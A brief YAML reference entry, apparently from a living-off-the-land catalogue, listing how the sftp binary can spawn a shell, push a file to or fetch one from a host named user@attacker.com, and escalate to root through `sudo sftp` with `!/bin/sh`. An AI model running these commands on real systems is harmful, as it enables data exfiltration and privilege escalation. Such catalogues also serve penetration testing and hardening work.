---
functions:
  shell:
    - code: |
        HOST=user@attacker.com
        sftp $HOST
        !/bin/sh
  file-upload:
    - description: Send local file to a SSH server.
      code: |
        RHOST=user@attacker.com
        sftp $RHOST
        put file_to_send file_to_save
  file-download:
    - description: Fetch a remote file from a SSH server.
      code: |
        RHOST=user@attacker.com
        sftp $RHOST
        get file_to_get file_to_save
  sudo:
    - code: |
        HOST=user@attacker.com
        sudo sftp $HOST
        !/bin/sh
---
